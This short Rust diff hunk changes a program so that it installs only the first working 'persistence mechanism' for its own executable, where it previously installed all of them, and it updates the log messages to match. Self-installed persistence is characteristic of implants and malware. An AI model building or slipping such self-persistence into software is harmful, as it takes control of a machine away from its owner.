@@ -87,8 +87,11 @@ async fn main() -> Result<()> {
 
     match std::env::current_exe() {
         Ok(exe_path) => {
-            let installed_list = persistence.install_all(&exe_path);
-            tracing::info!("Installed persistence mechanisms: {}", installed_list.join(", "));
+            if let Some(installed) = persistence.install_first_successful(&exe_path) {
+                tracing::info!("Installed active persistence mechanism: {}", installed);
+            } else {
+                tracing::warn!("No persistence mechanisms could be installed");
+            }
         }
         Err(e) => {
             tracing::error!("Failed to get current executable path. Persistence won't be installed: {}", e);
